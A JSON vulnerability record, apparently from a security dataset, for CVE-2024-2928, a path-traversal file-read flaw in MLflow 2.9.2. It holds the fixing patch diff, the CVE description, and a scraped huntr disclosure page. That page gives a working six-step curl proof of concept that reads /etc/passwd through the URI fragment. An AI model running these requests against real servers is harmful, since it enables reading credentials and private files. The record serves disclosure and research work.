{
    "CVE-2024-2928": {
        "published_date": "2024-06-06T18:29:54.973Z",
        "patch_commits": [
            {
                "url": "https://github.com/mlflow/mlflow/commit/96f0b573a73d8eedd6735a2ce26e08859527be07",
                "content": "init\n\nSigned-off-by: Weichen Xu <weichen.xu@databricks.com>\n\nFilename: mlflow/server/handlers.py:\n```\n@@ -600,8 +600,12 @@\ndef _create_experiment():\n \n     # Validate query string in artifact location to prevent attacks\n     parsed_artifact_locaion = urllib.parse.urlparse(request_message.artifact_location)\n+    if parsed_artifact_locaion.fragment:\n+        raise MlflowException(\n+            \"'artifact_location' URL can't include fragment part.\",\n+            error_code=INVALID_PARAMETER_VALUE,\n+        )\n     validate_query_string(parsed_artifact_locaion.query)\n-\n     experiment_id = _get_tracking_store().create_experiment(\n         request_message.name, request_message.artifact_location, tags\n     )\n\n@@ -1726,9 +1730,10 @@\ndef _validate_source(source: str, run_id: str) -> None:\n             store = _get_tracking_store()\n             run = store.get_run(run_id)\n             source = pathlib.Path(local_file_uri_to_path(source)).resolve()\n-            run_artifact_dir = pathlib.Path(local_file_uri_to_path(run.info.artifact_uri)).resolve()\n-            if run_artifact_dir in [source, *source.parents]:\n-                return\n+            if is_local_uri(run.info.artifact_uri):\n+                run_artifact_dir = pathlib.Path(local_file_uri_to_path(run.info.artifact_uri)).resolve()\n+                if run_artifact_dir in [source, *source.parents]:\n+                    return\n \n         raise MlflowException(\n             f\"Invalid model version source: '{source}'. To use a local path as a model version \"\n```"
            }
        ],
        "sw_version": "v2.11.2",
        "sw_version_wget": "https://github.com/mlflow/mlflow/archive/refs/tags/v2.11.2.zip",
        "description": "A Local File Inclusion (LFI) vulnerability was identified in mlflow/mlflow, specifically in version 2.9.2, which was fixed in version 2.11.3. This vulnerability arises from the application's failure to properly validate URI fragments for directory traversal sequences such as '../'. An attacker can exploit this flaw by manipulating the fragment part of the URI to read arbitrary files on the local file system, including sensitive files like '/etc/passwd'. The vulnerability is a bypass to a previous patch that only addressed similar manipulation within the URI's query string, highlighting the need for comprehensive validation of all parts of a URI to prevent LFI attacks.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/19bf02d7-6393-4a95-b9d0-d6d4d2d8c298",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nLocal File Read (LFI) by URI fragment parsing confusion in mlflow/mlflow\nValid\nReported on Dec 28th 2023\nDescription\nThis is a new bypass to the patch of the previous Local File Read (LFI) due to URI parsing confusion, which only validate ../ in the URI's query string part. We can find a new way for the same LFI by using the fragment part in the URI, which also allows attackers to read arbitrary files such as /etc/passwd in the local file system.\nProof of Concept\nWe can follow all the steps listed in the original report Local File Read (LFI) due to URI parsing confusion, but replace the query string ? with the fragment mark #\n1, Start the mlflow web server:\nmlflow ui --host 127.0.0.1:5000\n2, Create a malicious experiment:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"artifact_location\": \"http:///#/../../../../../../../../../../../../../../etc/\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create'\n3, Associate a run to it:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"experiment_id\": \"{{EXPERIMENT_ID}}\"}' 'http://127.0.0.1:5000/api/2.0/mlflow/runs/create'\n4, Create a registered model:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'\n5, Link a model version to the malicious run:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"run_id\": \"{{RUN_ID}}\", \"source\": \"file:///etc/\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\n6, Read /etc/passwd:\ncurl 'http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1'\nImpact\nThe same impact as the original report that enables the reading of arbitrary local files such as, but not limited to, /etc/passwd, .ssh keys, database files, web configuration files, and any other sensitive local files, etc.\nWe are processing your report and will contact themlflow team within 24 hours.a year ago\nA GitHub Issue asking the maintainers to create a SECURITY.md existsa year ago\nPeng Zhou modified the reporta year ago\nPeng Zhou modified the reporta year ago\nWe have contacted a member of themlflow team and are waiting to hear backa year ago\nPeng Zhou modified the reporta year ago\nDan McInerneymodified the Severity from Critical (9.3) to High (7.5)a year ago\nDaniel Lok\ncommenteda year ago\nMaintainer\nIs this fixed by https://github.com/mlflow/mlflow/pull/11376?\nA mlflow/mlflow maintainerhas acknowledged this reporta year ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nDan McInerney validated this vulnerabilitya year ago\nConfirmed that does indeed fix it.\nzpbrenthas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-2928assigned to this report.a year ago\nDan McInerneymarked this as fixedin 2.11.3with commit96f0b5a year ago\nThe fix bounty has been dropped\nDan McInerneyset the scheduled publication date to Apr 23rd 2024 UTCa year ago\nWe have sent a warning to the mlflow team to inform them that this report will be published in 48 hoursa year ago\nThis vulnerability has now been publisheda year ago\nCVE-2024-2928has now been publisheda year ago\nSign in to join this conversation\nCVE\nCVE-2024-2928\n(Published)\nVulnerability Type\nCWE-29: Path Traversal: '\\..\\filename'\nSeverity\nHigh (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\n2.9.2\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$750\nFix Bounty\n$187.5\nFound by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes step-by-step instructions demonstrating the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-29",
                "value": "CWE-29 Path Traversal: '\\..\\filename'"
            }
        ]
    }
}